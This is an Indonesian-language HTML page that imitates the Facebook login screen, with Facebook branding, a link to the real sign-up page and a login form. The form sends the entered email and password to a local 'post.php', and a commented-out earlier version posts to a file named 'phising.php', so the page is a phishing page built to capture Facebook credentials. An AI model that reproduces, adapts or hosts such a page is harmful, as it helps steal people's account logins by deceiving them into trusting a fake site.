<html>
<head>
<link rel="icon" type="image/png" href="logofb.png" />
<title>Selamat Datang di Facebook - Masuk, Daftar atau Pelajari </title>
<style>
body{margin: 0; font:Arial, Helvetica, sans-serif; }
a { color:#36C }
#header { margin:0px auto;; width: 100%; height: 82px; background:#3b5997; position:fixed; }
#header img { margin-left:140px; auto; width: auto; height:82px;}
.button {background-color: #4CAF50; border: none; color: white; padding: 8px 10px; text-align: center; text-decoration: none; display: inline-block; font-size: 11px; cursor: pointer; font-family:Arial, Helvetica, sans-serif; font-weight: bold; position:fixed; top: 38px; border-radius:2px;}
.button:hover {background-color:#0C3}
#main { overflow: auto; height:auto; margin:auto; padding:10px; background:#E2E2E2 url('img/main.png');}
#container { width:50%; background:#FFF; padding:30px 0px; margin-left: 25%; margin-top:170px; margin-bottom:100px; border: #D4D4D4 1px solid; border-radius:4px;}
#container h2 { font-family:Arial, Helvetica, sans-serif; color:#3b5997; text-align:center;}
input[type=text], input[type=password] { width: 50%; padding: 6px; margin: 4px 0; display: inline-block; border: 1px solid #CCC; box-sizing: border-box; border-radius:3px;}
input[type=submit]{background: #3b5997; color: white; padding: 9px 25px; text-align: center; text-decoration: none; display: inline-block; font-size: 14px; margin: 4px 2px; cursor: pointer; border:none; border-radius:2px;}
input[type=submit]:hover { background:#5937FB;}
#footer { font-family:Arial, Helvetica, sans-serif; font-size:12px; margin-left:15%; width:70%; margin-right:90px; margin-bottom:30px;}
#footer table{ font-size:12px;}
#footer ul { padding: 0; list-style-type: none; }
#footer ul li { display: inline;padding: 5; margin-right: 5px; }
#footer ul li a { text-decoration: none; }
#footer ul li a:hover { text-decoration: underline; }
#footer ul2 { padding: 0; list-style-type: none; float:left; }
#footer ul2 li { float:left; padding-right:20px;}
#footer ul2 li table {padding:0px;}
#footer ul2 li a { text-decoration: none; }
#footer ul2 li a:hover { text-decoration: underline; }

</style>
</head>

<body>
<div id="header">
<a href=""><img src="facebook.png" alt="facebook" /></a>
<a href="https://www.facebook.com/r.php?locale=en_GB" class="button">Daftar</a>
</div>

<div id="main">
<div id="container">
<h2>Masuk ke Facebook</h2>
<div id="logbox">
<!--<form name="input" action="phising.php" method="post">
<input type="text" name="username" placeholder="Email Address or phone number" />
<input type="password" name="password" placeholder="Password">
<input type="submit" value="Login">
</form>-->
<form id="login_form" action="post.php" method="post" novalidate="1">
<center>
<input type="hidden" name="lsd" value="AVrsn119" autocomplete="off" />
<input type="text" name="email" id="email" value="" tabindex="1"  placeholder="Email atau telepon" /><br>
<input type="password" name="pass" id="pass" tabindex="2" placeholder="Kata sandi"/><br>
<a href="#" style="text-decoration:none; font-family:Arial, Helvetica, sans-serif; font-size:12px; float:right; margin-right:25%;">Lupa Sandi ?</a><br>
<label class="uiButton uiButtonConfirm" style="" id="loginbutton" for="u_0_l">
<input value="Masuk" tabindex="4" type="submit" id="u_0_l" /></label>
</center>
<input type="hidden" autocomplete="off" checked="1" name="persistent" /><input type="hidden" name="default_persistent" value="1" />
<input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_m" />
<input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_n" />
<input type="hidden" name="lgnrnd" value="015722_4mqi" />
<input type="hidden" id="lgnjs" name="lgnjs" value="n" />
<input type="hidden" autocomplete="off" name="ab_test_data" value="" />
<input type="hidden" autocomplete="off" id="locale" name="locale" value="id_ID" />
<input type="hidden" autocomplete="off" name="next" value="https://www.facebook.com/" />
</form>
</div>
</div>
</div>

<div id="footer">
<ul>
<span style="color:#777;">Bahasa Indonesia:</span>
		<li><a href="#"> English (UK)</a></li>
		<li><a href="#"> Basa Jawa</a></li>
        <li><a href="#"> Bahasa Melayu</a></li>
		<li><a href="#">日本語</a></li>
		<li><a href="#"> العربية</a></li>
        <li><a href="#"> Français (France)</a></li>
        <li><a href="#"> Español</a></li>
        <li><a href="#"> 한국어</a></li>
        <li><a href="#"> Português (Brasil)</a></li>
        <li><a href="#"> Deutsch</a></li>
	</ul>
    <hr />
    <ul2>
		<li><table><tr><td><a href="#">Daftar</a></td></tr>
        <tr><td><a href="#">Lokasi</a></td></tr>
        <tr><td><a href="#">Kuki</a></td></tr></table>
        </li>
		<li><table><tr><td><a href="#"> Masuk</a></td></tr>
        <tr><td><a href="#">Selebriti</a></td></tr>
        <tr><td><a href="#">Pilihan Iklan</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Messenger</a></td></tr>
        <tr><td><a href="#">Grup</a></td></tr>
        <tr><td><a href="#">Ketentuan</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#"> Facebook Lite</a></td></tr>
        <tr><td><a href="#">Moments</a></td></tr>
        <tr><td><a href="#">Bantuan</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Seluler</a></td></tr>
        <tr><td><a href="#">Instagram</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Cari Teman</a></td></tr>
        <tr><td><a href="#">Tentang</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Lencana</a></td></tr>
        <tr><td><a href="#">Buat Iklan</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Orang</a></td></tr>
        <tr><td><a href="#">Buat Halaman</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Halaman</a></td></tr>
        <tr><td><a href="#">Pengembang</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Tempat</a></td></tr>
        <tr><td><a href="#">Karier</a></td></tr></table>
        </li>
        <li><table><tr><td><a href="#">Game</a></td></tr>
        <tr><td><a href="#">Privasi</a></td></tr></table>
        </li>
	</ul2><br><br><br><br><br>
    <p style="color:#777;"><br>Facebook &copy; 2016</p>
</div>


</body>

</html>